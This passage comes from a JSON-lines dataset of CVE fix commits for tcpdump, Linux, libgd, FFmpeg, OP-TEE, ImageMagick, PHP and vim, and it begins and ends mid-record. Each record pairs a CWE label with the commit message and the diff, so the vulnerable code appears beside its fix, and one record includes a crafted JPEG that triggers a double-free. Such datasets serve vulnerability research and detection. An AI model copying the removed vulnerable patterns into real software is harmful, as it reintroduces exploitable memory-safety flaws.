323\nzcmca|c+)~A1{MZ}hW`!>Kp@S?z>p23fAWW}Z}~3(=65V&lwsguS7K-e$_g;feZcVV\nz!cYDPu)HH9D?`U376ylg{{nqN42%%{zt6+uJ%Q#y^fNW$*3T%zRK%mD#0s=PhCzUV\nz0mJ~>v>Ip=2N;}&P(ZSQfukP6`3t0Y*f==YL0lGy7$<~+lkA`1Ob+&UU^W9pgpY$k\nqA%#IfKmiDBKm-UxNg1-gV~lbQ@Q4hGcMkDEXhyIY7?5;=GywqfP&~{4\n\nliteral 0\nHcmV?d00001\n\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2018-11232", "CWE_ID": "20", "category": "security", "commit_id": "f09444639099584bc4784dfcd85ada67c6f33e0f", "commit_message": "From f09444639099584bc4784dfcd85ada67c6f33e0f Mon Sep 17 00:00:00 2001\nFrom: Wang Nan <wangnan0@huawei.com>\nDate: Mon, 23 Jan 2017 10:41:22 -0700\nSubject: [PATCH] coresight: fix kernel panic caused by invalid CPU\n\nCommit d52c9750f150 (\"coresight: reset \"enable_sink\" flag when need be\")\ncaused a kernel panic because of the using of an invalid value: after\n'for_each_cpu(cpu, mask)', value of local variable 'cpu' become invalid,\ncauses following 'cpu_to_node' access invalid memory area.\n\nThis patch brings the deleted 'cpu = cpumask_first(mask)' back.\n\nPanic log:\n\n $ perf record -e cs_etm// ls\n\n Unable to handle kernel paging request at virtual address fffe801804af4f10\n pgd = ffff8017ce031600\n [fffe801804af4f10] *pgd=0000000000000000, *pud=0000000000000000\n Internal error: Oops: 96000004 [#1] SMP\n Modules linked in:\n CPU: 33 PID: 1619 Comm: perf Not tainted 4.7.1+ #16\n Hardware name: Huawei Taishan 2280 /CH05TEVBA, BIOS 1.10 11/24/2016\n task: ffff8017cb0c8400 ti: ffff8017cb154000 task.ti: ffff8017cb154000\n PC is at tmc_alloc_etf_buffer+0x60/0xd4\n LR is at tmc_alloc_etf_buffer+0x44/0xd4\n pc : [<ffff000008633df8>] lr : [<ffff000008633ddc>] pstate: 60000145\n sp : ffff8017cb157b40\n x29: ffff8017cb157b40 x28: 0000000000000000\n ...skip...\n 7a60: ffff000008c64dc8 0000000000000006 0000000000000253 ffffffffffffffff\n 7a80: 0000000000000000 0000000000000000 ffff0000080872cc 0000000000000001\n [<ffff000008633df8>] tmc_alloc_etf_buffer+0x60/0xd4\n [<ffff000008632b9c>] etm_setup_aux+0x1dc/0x1e8\n [<ffff00000816eed4>] rb_alloc_aux+0x2b0/0x338\n [<ffff00000816a5e4>] perf_mmap+0x414/0x568\n [<ffff0000081ab694>] mmap_region+0x324/0x544\n [<ffff0000081abbe8>] do_mmap+0x334/0x3e0\n [<ffff000008191150>] vm_mmap_pgoff+0xa4/0xc8\n [<ffff0000081a9a30>] SyS_mmap_pgoff+0xb0/0x22c\n [<ffff0000080872e4>] sys_mmap+0x18/0x28\n [<ffff0000080843f0>] el0_svc_naked+0x24/0x28\n Code: 912040a5 d0001c00 f873d821 911c6000 (b8656822)\n ---[ end trace 98933da8f92b0c9a ]---\n\nSigned-off-by: Wang Nan <wangnan0@huawei.com>\nCc: Xia Kaixu <xiakaixu@huawei.com>\nCc: Li Zefan <lizefan@huawei.com>\nCc: Mathieu Poirier <mathieu.poirier@linaro.org>\nCc: linux-arm-kernel@lists.infradead.org\nCc: linux-kernel@vger.kernel.org\nFixes: d52c9750f150 (\"coresight: reset \"enable_sink\" flag when need be\")\nSigned-off-by: Mathieu Poirier <mathieu.poirier@linaro.org>\nCc: stable <stable@vger.kernel.org> # 4.10\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers/hwtracing/coresight/coresight-etm-perf.c | 1 +\n 1 file changed, 1 insertion(+)\n\n", "diff_code": "diff --git a/drivers/hwtracing/coresight/coresight-etm-perf.c b/drivers/hwtracing/coresight/coresight-etm-perf.c\nindex 17741969026e0..26cfac3e6de7b 100644\n--- a/drivers/hwtracing/coresight/coresight-etm-perf.c\n+++ b/drivers/hwtracing/coresight/coresight-etm-perf.c\n@@ -242,6 +242,7 @@ static void *etm_setup_aux(int event_cpu, void **pages,\n \tif (!sink_ops(sink)->alloc_buffer)\n \t\tgoto err;\n \n+\tcpu = cpumask_first(mask);\n \t/* Get the AUX specific data from the sink buffer */\n \tevent_data->snk_config =\n \t\t\tsink_ops(sink)->alloc_buffer(sink, cpu, pages,\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-6912", "CWE_ID": "415", "category": "security", "commit_id": "a49feeae76d41959d85ee733925a4cf40bac61b2", "commit_message": "From a49feeae76d41959d85ee733925a4cf40bac61b2 Mon Sep 17 00:00:00 2001\nFrom: \"Christoph M. Becker\" <cmbecker69@gmx.de>\nDate: Tue, 16 Aug 2016 17:40:23 +0200\nSubject: [PATCH] Fix double-free in gdImageWebPtr()\n\nThe issue is that gdImageWebpCtx() (which is called by gdImageWebpPtr() and\nthe other WebP output functions to do the real work) does not return whether\nit succeeded or failed, so this is not checked in gdImageWebpPtr() and the\nfunction wrongly assumes everything is okay, which is not, in this case,\nbecause there is a size limitation for WebP, namely that the width and\nheight must by less than 16383.\n\nWe can't change the signature of gdImageWebpCtx() for API compatibility\nreasons, so we introduce the static helper _gdImageWebpCtx() which returns\nsuccess respective failure, so gdImageWebpPtr() and gdImageWebpPtrEx() can\ncheck the return value. We leave it solely to libwebp for now to report\nwarnings regarding the failing write.\n\nThis issue had been reported by Ibrahim El-Sayed to security@libgd.org.\n\nCVE-2016-6912\n---\n src/gd_webp.c                  |  74 ++++++++++++++++++++-------------\n tests/webp/.gitignore          |   1 +\n tests/webp/CMakeLists.txt      |   1 +\n tests/webp/Makemodule.am       |   6 ++-\n tests/webp/bug_double_free.c   |  29 +++++++++++++\n tests/webp/bug_double_free.jpg | Bin 0 -> 576 bytes\n 6 files changed, 81 insertions(+), 30 deletions(-)\n create mode 100644 tests/webp/bug_double_free.c\n create mode 100644 tests/webp/bug_double_free.jpg\n\n", "diff_code": "diff --git a/src/gd_webp.c b/src/gd_webp.c\nindex 98863992..b5ee2642 100644\n--- a/src/gd_webp.c\n+++ b/src/gd_webp.c\n@@ -162,37 +162,24 @@ BGD_DECLARE(gdImagePtr) gdImageCreateFromWebpCtx (gdIOCtx * infile)\n \treturn im;\n }\n \n-/*\n-  Function: gdImageWebpCtx\n-\n-    Write the image as WebP data via a <gdIOCtx>. See <gdImageWebpEx>\n-    for more details.\n-\n-  Parameters:\n-\n-    im      - The image to write.\n-    outfile - The output sink.\n-    quality - Image quality.\n \n-  Returns:\n-\n-    Nothing.\n-*/\n-BGD_DECLARE(void) gdImageWebpCtx (gdImagePtr im, gdIOCtx * outfile, int quality)\n+/* returns 0 on success, 1 on failure */\n+static int _gdImageWebpCtx (gdImagePtr im, gdIOCtx * outfile, int quality)\n {\n \tuint8_t *argb;\n \tint x, y;\n \tuint8_t *p;\n \tuint8_t *out;\n \tsize_t out_size;\n+    int ret = 0;\n \n \tif (im == NULL) {\n-\t\treturn;\n+\t\treturn 1;\n \t}\n \n \tif (!gdImageTrueColor(im)) {\n-\t\tgd_error(\"Paletter image not supported by webp\");\n-\t\treturn;\n+\t\tgd_error(\"Palette image not supported by webp\");\n+\t\treturn 1;\n \t}\n \n \tif (quality == -1) {\n@@ -200,16 +187,16 @@ BGD_DECLARE(void) gdImageWebpCtx (gdImagePtr im, gdIOCtx * outfile, int quality)\n \t}\n \n \tif (overflow2(gdImageSX(im), 4)) {\n-\t\treturn;\n+\t\treturn 1;\n \t}\n \n \tif (overflow2(gdImageSX(im) * 4, gdImageSY(im))) {\n-\t\treturn;\n+\t\treturn 1;\n \t}\n \n \targb = (uint8_t *)gdMalloc(gdImageSX(im) * 4 * gdImageSY(im));\n \tif (!argb) {\n-\t\treturn;\n+\t\treturn 1;\n \t}\n \tp = argb;\n \tfor (y = 0; y < gdImageSY(im); y++) {\n@@ -232,6 +219,7 @@ BGD_DECLARE(void) gdImageWebpCtx (gdImagePtr im, gdIOCtx * outfile, int quality)\n \tout_size = WebPEncodeRGBA(argb, gdImageSX(im), gdImageSY(im), gdImageSX(im) * 4, quality, &out);\n \tif (out_size == 0) {\n \t\tgd_error(\"gd-webp encoding failed\");\n+        ret = 1;\n \t\tgoto freeargb;\n \t}\n \tgdPutBuf(out, out_size, outfile);\n@@ -239,6 +227,30 @@ BGD_DECLARE(void) gdImageWebpCtx (gdImagePtr im, gdIOCtx * outfile, int quality)\n \n freeargb:\n \tgdFree(argb);\n+\n+    return ret;\n+}\n+\n+\n+/*\n+  Function: gdImageWebpCtx\n+\n+    Write the image as WebP data via a <gdIOCtx>. See <gdImageWebpEx>\n+    for more details.\n+\n+  Parameters:\n+\n+    im      - The image to write.\n+    outfile - The output sink.\n+    quality - Image quality.\n+\n+  Returns:\n+\n+    Nothing.\n+*/\n+BGD_DECLARE(void) gdImageWebpCtx (gdImagePtr im, gdIOCtx * outfile, int quality)\n+{\n+\t_gdImageWebpCtx(im, outfile, quality);\n }\n \n /*\n@@ -278,7 +290,7 @@ BGD_DECLARE(void) gdImageWebpEx (gdImagePtr im, FILE * outFile, int quality)\n \tif (out == NULL) {\n \t\treturn;\n \t}\n-\tgdImageWebpCtx(im, out, quality);\n+\t_gdImageWebpCtx(im, out, quality);\n \tout->gd_free(out);\n }\n \n@@ -302,7 +314,7 @@ BGD_DECLARE(void) gdImageWebp (gdImagePtr im, FILE * outFile)\n \tif (out == NULL) {\n \t\treturn;\n \t}\n-\tgdImageWebpCtx(im, out, -1);\n+\t_gdImageWebpCtx(im, out, -1);\n \tout->gd_free(out);\n }\n \n@@ -318,8 +330,11 @@ BGD_DECLARE(void *) gdImageWebpPtr (gdImagePtr im, int *size)\n \tif (out == NULL) {\n \t\treturn NULL;\n \t}\n-\tgdImageWebpCtx(im, out, -1);\n-\trv = gdDPExtractData(out, size);\n+\tif (_gdImageWebpCtx(im, out, -1)) {\n+\t\trv = NULL;\n+\t} else {\n+\t\trv = gdDPExtractData(out, size);\n+\t}\n \tout->gd_free(out);\n \n \treturn rv;\n@@ -337,8 +352,11 @@ BGD_DECLARE(void *) gdImageWebpPtrEx (gdImagePtr im, int *size, int quality)\n \tif (out == NULL) {\n \t\treturn NULL;\n \t}\n-\tgdImageWebpCtx(im, out, quality);\n-\trv = gdDPExtractData(out, size);\n+\tif (_gdImageWebpCtx(im, out, quality)) {\n+        rv = NULL;\n+    } else {\n+        rv = gdDPExtractData(out, size);\n+    }\n \tout->gd_free(out);\n \treturn rv;\n }\ndiff --git a/tests/webp/.gitignore b/tests/webp/.gitignore\nindex 56a05930..569ccda8 100644\n--- a/tests/webp/.gitignore\n+++ b/tests/webp/.gitignore\n@@ -1 +1,2 @@\n /bug00111\n+/bug_double_free\ndiff --git a/tests/webp/CMakeLists.txt b/tests/webp/CMakeLists.txt\nindex 6af76bab..ec27127b 100644\n--- a/tests/webp/CMakeLists.txt\n+++ b/tests/webp/CMakeLists.txt\n@@ -1,6 +1,7 @@\n IF(WEBP_FOUND)\n LIST(APPEND TESTS_FILES\n \tbug00111\n+\tbug_double_free\n )\n ENDIF(WEBP_FOUND)\n \ndiff --git a/tests/webp/Makemodule.am b/tests/webp/Makemodule.am\nindex b03db6e2..f01f9e67 100644\n--- a/tests/webp/Makemodule.am\n+++ b/tests/webp/Makemodule.am\n@@ -1,7 +1,9 @@\n if HAVE_LIBWEBP\n libgd_test_programs += \\\n-\twebp/bug00111\n+\twebp/bug00111 \\\n+\twebp/bug_double_free\n endif\n \n EXTRA_DIST += \\\n-\twebp/CMakeLists.txt\n+\twebp/CMakeLists.txt \\\n+\twebp/bug_double_free.jpg\ndiff --git a/tests/webp/bug_double_free.c b/tests/webp/bug_double_free.c\nnew file mode 100644\nindex 00000000..43eececf\n--- /dev/null\n+++ b/tests/webp/bug_double_free.c\n@@ -0,0 +1,29 @@\n+/**\n+ * Test that a too large image doesn't trigger an double-free when written\n+ * to memory.\n+ */\n+\n+\n+#include \"gd.h\"\n+#include \"gdtest.h\"\n+\n+\n+int main()\n+{\n+    gdImagePtr im1, im2;\n+    FILE *fp;\n+    int size;\n+\n+    fp = gdTestFileOpen2(\"webp\", \"bug_double_free.jpg\");\n+    gdTestAssert(fp != NULL);\n+    im1 = gdImageCreateFromJpeg(fp);\n+    gdTestAssert(im1 != NULL);\n+    fclose(fp);\n+\n+    im2 = gdImageWebpPtr(im1, &size);\n+    gdTestAssert(im2 == NULL);\n+\n+    gdImageDestroy(im1);\n+\n+    return gdNumFailures();\n+}\ndiff --git a/tests/webp/bug_double_free.jpg b/tests/webp/bug_double_free.jpg\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..9b792fb4a7d17578b445af1ba530e4df7ac47df1\nGIT binary patch\nliteral 576\nzcmex=<NpH&0WUXCHwH#VCI&wsWcdG&!NV;xCsm<1zqBYh)k-0wq@=(~Uq3lNH#a}8\nzSg$-YJ2N*mB{NYkzbIWF#M1{Uw{j`U%*)QqOOG#4EJ-cW%PL6!f1AOXfsKWgjg^Is\nzjg^g^osEM_fQyThlS_n;pGQDkL_$JbL`+OdR#jd~T3JR+OhHFMSxsG2OH)!_*Faap\nzKvhFi17rvzJ3BiU2bVAxm#~JEn3M+5fE%jv{{aR;4u=2rGR%xh3`~NI%z}*nk1$9w\nzFfcJQG9Up~c4ihf4xp5Q00Sd4GZPCl8#`2*k%^gwRZx*Zh>cy?&@phLh>}rIVxy?C\nzaZ+K^L7)x^Mn(oy!<ZPDSwPmv3IeSGAvgdAHM63i5YU|ew-|VUx|jr+1sUuaob_HF\nzKf~w7)_?nLb3^Xzthd(FvnLtl|90DQZIy|so641wolM@3en`E3n_QilSDauH!BAA-\nzD0P&pX!f_MwYg4bxBC5F@WN0ud0F%hZYiT#;l7JEGitqmc%y8i*zb5(nYy*l7x+%j\nze;no_E4J5#U3`Yge}-6x<AUlA3W9Y{67G9XbGWu!@zRTeC)NE6rKX;<UcA!f=6zq?\nf=bKX-^dFcl58S~Jp13eIedCSEeT&uq-{b-SCsLl(\n\nliteral 0\nHcmV?d00001\n\n", "owner": "libgd", "repo": "libgd", "source": "cve"}
{"CVE_ID": "CVE-2017-14767", "CWE_ID": "119", "category": "security", "commit_id": "c42a1388a6d1bfd8001bf6a4241d8ca27e49326d", "commit_message": "From c42a1388a6d1bfd8001bf6a4241d8ca27e49326d Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michael@niedermayer.cc>\nDate: Wed, 23 Aug 2017 21:30:37 +0200\nSubject: [PATCH] avformat/rtpdec_h264: Fix heap-buffer-overflow\n\nFixes: rtp_sdp/poc.sdp\n\nFound-by: Bingchang <l.bing.chang.bc@gmail.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>\n---\n libavformat/rtpdec_h264.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/libavformat/rtpdec_h264.c b/libavformat/rtpdec_h264.c\nindex 8dd56a549e4..6f8148ab6d5 100644\n--- a/libavformat/rtpdec_h264.c\n+++ b/libavformat/rtpdec_h264.c\n@@ -166,7 +166,7 @@ static int sdp_parse_fmtp_config_h264(AVFormatContext *s,\n             parse_profile_level_id(s, h264_data, value);\n     } else if (!strcmp(attr, \"sprop-parameter-sets\")) {\n         int ret;\n-        if (value[strlen(value) - 1] == ',') {\n+        if (*value == 0 || value[strlen(value) - 1] == ',') {\n             av_log(s, AV_LOG_WARNING, \"Missing PPS in sprop-parameter-sets, ignoring\\n\");\n             return 0;\n         }\n", "owner": "FFmpeg", "repo": "FFmpeg", "source": "cve"}
{"CVE_ID": "CVE-2019-1010295", "CWE_ID": "119", "category": "security", "commit_id": "d5c5b0b77b2b589666024d219a8007b3f5b6faeb", "commit_message": "From d5c5b0b77b2b589666024d219a8007b3f5b6faeb Mon Sep 17 00:00:00 2001\nFrom: Jens Wiklander <jens.wiklander@linaro.org>\nDate: Tue, 20 Nov 2018 09:56:58 +0100\nSubject: [PATCH] core: svc: always check ta parameters\n\nAlways check TA parameters from a user TA. This prevents a user TA from\npassing invalid pointers to a pseudo TA.\n\nFixes: OP-TEE-2018-0007: \"Buffer checks missing when calling pseudo\nTAs\".\n\nSigned-off-by: Jens Wiklander <jens.wiklander@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Joakim Bech <joakim.bech@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>\n---\n core/tee/tee_svc.c | 18 +++++++++++++++---\n 1 file changed, 15 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/core/tee/tee_svc.c b/core/tee/tee_svc.c\nindex 01392ba279..2be5b3f57f 100644\n--- a/core/tee/tee_svc.c\n+++ b/core/tee/tee_svc.c\n@@ -494,7 +494,9 @@ TEE_Result syscall_get_property_name_to_index(unsigned long prop_set,\n \treturn res;\n }\n \n-static void utee_param_to_param(struct tee_ta_param *p, struct utee_params *up)\n+static TEE_Result utee_param_to_param(struct user_ta_ctx *utc,\n+\t\t\t\t      struct tee_ta_param *p,\n+\t\t\t\t      struct utee_params *up)\n {\n \tsize_t n;\n \tuint32_t types = up->types;\n@@ -503,14 +505,20 @@ static void utee_param_to_param(struct tee_ta_param *p, struct utee_params *up)\n \tfor (n = 0; n < TEE_NUM_PARAMS; n++) {\n \t\tuintptr_t a = up->vals[n * 2];\n \t\tsize_t b = up->vals[n * 2 + 1];\n+\t\tuint32_t flags = TEE_MEMORY_ACCESS_READ |\n+\t\t\t\t TEE_MEMORY_ACCESS_ANY_OWNER;\n \n \t\tswitch (TEE_PARAM_TYPE_GET(types, n)) {\n-\t\tcase TEE_PARAM_TYPE_MEMREF_INPUT:\n \t\tcase TEE_PARAM_TYPE_MEMREF_OUTPUT:\n \t\tcase TEE_PARAM_TYPE_MEMREF_INOUT:\n+\t\t\tflags |= TEE_MEMORY_ACCESS_WRITE;\n+\t\t\t/*FALLTHROUGH*/\n+\t\tcase TEE_PARAM_TYPE_MEMREF_INPUT:\n \t\t\tp->u[n].mem.mobj = &mobj_virt;\n \t\t\tp->u[n].mem.offs = a;\n \t\t\tp->u[n].mem.size = b;\n+\t\t\tif (tee_mmu_check_access_rights(utc, flags, a, b))\n+\t\t\t\treturn TEE_ERROR_ACCESS_DENIED;\n \t\t\tbreak;\n \t\tcase TEE_PARAM_TYPE_VALUE_INPUT:\n \t\tcase TEE_PARAM_TYPE_VALUE_INOUT:\n@@ -522,6 +530,8 @@ static void utee_param_to_param(struct tee_ta_param *p, struct utee_params *up)\n \t\t\tbreak;\n \t\t}\n \t}\n+\n+\treturn TEE_SUCCESS;\n }\n \n static TEE_Result alloc_temp_sec_mem(size_t size, struct mobj **mobj,\n@@ -575,7 +585,9 @@ static TEE_Result tee_svc_copy_param(struct tee_ta_session *sess,\n \t\t\t(uaddr_t)callee_params, sizeof(struct utee_params));\n \t\tif (res != TEE_SUCCESS)\n \t\t\treturn res;\n-\t\tutee_param_to_param(param, callee_params);\n+\t\tres = utee_param_to_param(utc, param, callee_params);\n+\t\tif (res != TEE_SUCCESS)\n+\t\t\treturn res;\n \t}\n \n \tif (called_sess && is_pseudo_ta_ctx(called_sess->ctx)) {\n", "owner": "OP-TEE", "repo": "optee_os", "source": "cve"}
{"CVE_ID": "CVE-2017-8069", "CWE_ID": "119", "category": "security", "commit_id": "7926aff5c57b577ab0f43364ff0c59d968f6a414", "commit_message": "From 7926aff5c57b577ab0f43364ff0c59d968f6a414 Mon Sep 17 00:00:00 2001\nFrom: Ben Hutchings <ben@decadent.org.uk>\nDate: Sat, 4 Feb 2017 16:56:32 +0000\nSubject: [PATCH] rtl8150: Use heap buffers for all register access\n\nAllocating USB buffers on the stack is not portable, and no longer\nworks on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 (\"Linux-2.6.12-rc2\")\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers/net/usb/rtl8150.c | 34 +++++++++++++++++++++++++++-------\n 1 file changed, 27 insertions(+), 7 deletions(-)\n\n", "diff_code": "diff --git a/drivers/net/usb/rtl8150.c b/drivers/net/usb/rtl8150.c\nindex 95b7bd0d7abca..c81c79110cefc 100644\n--- a/drivers/net/usb/rtl8150.c\n+++ b/drivers/net/usb/rtl8150.c\n@@ -155,16 +155,36 @@ static const char driver_name [] = \"rtl8150\";\n */\n static int get_registers(rtl8150_t * dev, u16 indx, u16 size, void *data)\n {\n-\treturn usb_control_msg(dev->udev, usb_rcvctrlpipe(dev->udev, 0),\n-\t\t\t       RTL8150_REQ_GET_REGS, RTL8150_REQT_READ,\n-\t\t\t       indx, 0, data, size, 500);\n+\tvoid *buf;\n+\tint ret;\n+\n+\tbuf = kmalloc(size, GFP_NOIO);\n+\tif (!buf)\n+\t\treturn -ENOMEM;\n+\n+\tret = usb_control_msg(dev->udev, usb_rcvctrlpipe(dev->udev, 0),\n+\t\t\t      RTL8150_REQ_GET_REGS, RTL8150_REQT_READ,\n+\t\t\t      indx, 0, buf, size, 500);\n+\tif (ret > 0 && ret <= size)\n+\t\tmemcpy(data, buf, ret);\n+\tkfree(buf);\n+\treturn ret;\n }\n \n-static int set_registers(rtl8150_t * dev, u16 indx, u16 size, void *data)\n+static int set_registers(rtl8150_t * dev, u16 indx, u16 size, const void *data)\n {\n-\treturn usb_control_msg(dev->udev, usb_sndctrlpipe(dev->udev, 0),\n-\t\t\t       RTL8150_REQ_SET_REGS, RTL8150_REQT_WRITE,\n-\t\t\t       indx, 0, data, size, 500);\n+\tvoid *buf;\n+\tint ret;\n+\n+\tbuf = kmemdup(data, size, GFP_NOIO);\n+\tif (!buf)\n+\t\treturn -ENOMEM;\n+\n+\tret = usb_control_msg(dev->udev, usb_sndctrlpipe(dev->udev, 0),\n+\t\t\t      RTL8150_REQ_SET_REGS, RTL8150_REQT_WRITE,\n+\t\t\t      indx, 0, buf, size, 500);\n+\tkfree(buf);\n+\treturn ret;\n }\n \n static void async_set_reg_cb(struct urb *urb)\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2015-8958", "CWE_ID": "125", "category": "security", "commit_id": "b8f17d08b7418204bf8a05a5c24e87b2fc395b75", "commit_message": "From b8f17d08b7418204bf8a05a5c24e87b2fc395b75 Mon Sep 17 00:00:00 2001\nFrom: cristy <urban-warrior@git.imagemagick.org>\nDate: Sat, 10 Jan 2015 14:10:16 +0000\nSubject: [PATCH] \n http://www.imagemagick.org/discourse-server/viewtopic.php?f=3&t=26857\n\n---\n coders/sun.c | 6 +++---\n 1 file changed, 3 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/coders/sun.c b/coders/sun.c\nindex af1a7289bf..728bffa4d3 100644\n--- a/coders/sun.c\n+++ b/coders/sun.c\n@@ -409,8 +409,8 @@ static Image *ReadSUNImage(const ImageInfo *image_info,ExceptionInfo *exception)\n         sun_info.length || !sun_info.length)\n       ThrowReaderException(ResourceLimitError,\"MemoryAllocationFailed\");\n     number_pixels=(MagickSizeType) image->columns*image->rows;\n-    if ((sun_info.type != RT_ENCODED) && (sun_info.depth >= 8) &&\n-        ((number_pixels*((sun_info.depth+7)/8)) > sun_info.length))\n+    if ((sun_info.type != RT_ENCODED) && \n+        ((number_pixels*sun_info.depth) > (8*sun_info.length)))\n       ThrowReaderException(CorruptImageError,\"ImproperImageHeader\");\n     bytes_per_line=sun_info.width*sun_info.depth;\n     sun_data=(unsigned char *) AcquireQuantumMemory((size_t) MagickMax(\n@@ -532,7 +532,7 @@ static Image *ReadSUNImage(const ImageInfo *image_info,ExceptionInfo *exception)\n             bytes_per_pixel++;\n           if (bytes_per_line == 0)\n             bytes_per_line=bytes_per_pixel*image->columns;\n-          length=image->rows*(bytes_per_line+image->columns % 2);\n+          length=image->rows*(bytes_per_line+bytes_per_line % 2);\n           if (((sun_info.type == RT_ENCODED) &&\n                (length > (bytes_per_line*image->rows))) ||\n               ((sun_info.type != RT_ENCODED) && (length > sun_info.length)))\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
{"CVE_ID": "CVE-2017-5340", "CWE_ID": "190", "category": "security", "commit_id": "4cc0286f2f3780abc6084bcdae5dce595daa3c12", "commit_message": "From 4cc0286f2f3780abc6084bcdae5dce595daa3c12 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Mon, 2 Jan 2017 20:14:05 -0800\nSubject: [PATCH] Fix #73832 - leave the table in a safe state if the size is\n too big.\n\n---\n Zend/zend_hash.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/Zend/zend_hash.c b/Zend/zend_hash.c\nindex 322422da155b..8b54a3932d0a 100644\n--- a/Zend/zend_hash.c\n+++ b/Zend/zend_hash.c\n@@ -175,7 +175,6 @@ ZEND_API void ZEND_FASTCALL _zend_hash_init(HashTable *ht, uint32_t nSize, dtor_\n \tGC_REFCOUNT(ht) = 1;\n \tGC_TYPE_INFO(ht) = IS_ARRAY;\n \tht->u.flags = (persistent ? HASH_FLAG_PERSISTENT : 0) | HASH_FLAG_APPLY_PROTECTION | HASH_FLAG_STATIC_KEYS;\n-\tht->nTableSize = zend_hash_check_size(nSize);\n \tht->nTableMask = HT_MIN_MASK;\n \tHT_SET_DATA_ADDR(ht, &uninitialized_bucket);\n \tht->nNumUsed = 0;\n@@ -183,6 +182,7 @@ ZEND_API void ZEND_FASTCALL _zend_hash_init(HashTable *ht, uint32_t nSize, dtor_\n \tht->nInternalPointer = HT_INVALID_IDX;\n \tht->nNextFreeElement = 0;\n \tht->pDestructor = pDestructor;\n+\tht->nTableSize = zend_hash_check_size(nSize);\n }\n \n static void ZEND_FASTCALL zend_hash_packed_grow(HashTable *ht)\n", "owner": "php", "repo": "php-src", "source": "cve"}
{"CVE_ID": "CVE-2017-5953", "CWE_ID": "190", "category": "security", "commit_id": "399c297aa93afe2c0a39e2a1b3f972aebba44c9d", "commit_message": "From 399c297aa93afe2c0a39e2a1b3f972aebba44c9d Mon Sep 17 00:00:00 2001\nFrom: Bram Moolenaar <Bram@vim.org>\nDate: Thu, 9 Feb 2017 21:07:12 +0100\nSubject: [PATCH] patch 8.0.0322: possible overflow with corrupted spell file\n\nProblem:    Possible overflow with spell file where the tree length is\n            corrupted.\nSolution:   Check for an invalid length (suggested by shqking)\n---\n src/spellfile.c | 3 +++\n src/version.c   | 2 ++\n 2 files changed, 5 insertions(+)\n\n", "diff_code": "diff --git a/src/spellfile.c b/src/spellfile.c\nindex c7d87c6c72..8b1a3a633e 100644\n--- a/src/spellfile.c\n+++ b/src/spellfile.c\n@@ -1595,6 +1595,9 @@ spell_read_tree(\n     len = get4c(fd);\n     if (len < 0)\n \treturn SP_TRUNCERROR;\n+    if (len >= 0x3ffffff)\n+\t/* Invalid length, multiply with sizeof(int) would overflow. */\n+\treturn SP_FORMERROR;\n     if (len > 0)\n     {\n \t/* Allocate the byte array. */\ndiff --git a/src/version.c b/src/version.c\nindex 7a3d21513f..c1a5186bac 100644\n--- a/src/version.c\n+++ b/src/version.c\n@@ -764,6 +764,8 @@ static char *(features[]) =\n \n static int included_patches[] =\n {   /* Add new patch number below this line */\n+/**/\n+    322,\n /**/\n     321,\n /**/\n", "owner": "vim", "repo": "vim", "source": "cve"}
{"CVE_ID": "CVE-2012-2119", "CWE_ID": "119", "category": "security", "commit_id": "b92946e2919134ebe2a4083e4302236295ea2a73", "commit_message": "From b92946e2919134ebe2a4083e4302236295ea2a73 Mon Sep 17 00:00:00 2001\nFrom: Jason Wang <jasowang@redhat.com>\nDate: Wed, 2 May 2012 11:42:15 +0800\nSubject: [PATCH] macvtap: zerocopy: validate vectors before building skb\n\nThere're several reasons that the vectors need to be validated:\n\n- Return error when caller provides vectors whose num is greater than UIO_MAXIOV.\n- Linearize part of skb when userspace provides vectors grater than MAX_SKB_FRAGS.\n- Return error when userspace provides vectors whose total length may exceed\n- MAX_SKB_FRAGS * PAGE_SIZE.\n\nSigned-off-by: Jason Wang <jasowang@redhat.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\n---\n drivers/net/macvtap.c | 25 +++++++++++++++++++++----\n 1 file changed, 21 insertions(+), 4 deletions(-)\n\n", "diff_code": "diff --git a/drivers/net/macvtap.c b/drivers/net/macvtap.c\nindex a4ff694cea228..163559c169883 100644\n--- a/drivers/net/macvtap.c\n+++ b/drivers/net/macvtap.c\n@@ -529,9 +529,10 @@ static int zerocopy_sg_from_iovec(struct sk_buff *skb, const struct iovec *from,\n \t\t}\n \t\tbase = (unsigned long)from->iov_base + offset;\n \t\tsize = ((base & ~PAGE_MASK) + len + ~PAGE_MASK) >> PAGE_SHIFT;\n+\t\tif (i + size > MAX_SKB_FRAGS)\n+\t\t\treturn -EMSGSIZE;\n \t\tnum_pages = get_user_pages_fast(base, size, 0, &page[i]);\n-\t\tif ((num_pages != size) ||\n-\t\t    (num_pages > MAX_SKB_FRAGS - skb_shinfo(skb)->nr_frags)) {\n+\t\tif (num_pages != size) {\n \t\t\tfor (i = 0; i < num_pages; i++)\n \t\t\t\tput_page(page[i]);\n \t\t\treturn -EFAULT;\n@@ -651,7 +652,7 @@ static ssize_t macvtap_get_user(struct macvtap_queue *q, struct msghdr *m,\n \tint err;\n \tstruct virtio_net_hdr vnet_hdr = { 0 };\n \tint vnet_hdr_len = 0;\n-\tint copylen;\n+\tint copylen = 0;\n \tbool zerocopy = false;\n \n \tif (q->flags & IFF_VNET_HDR) 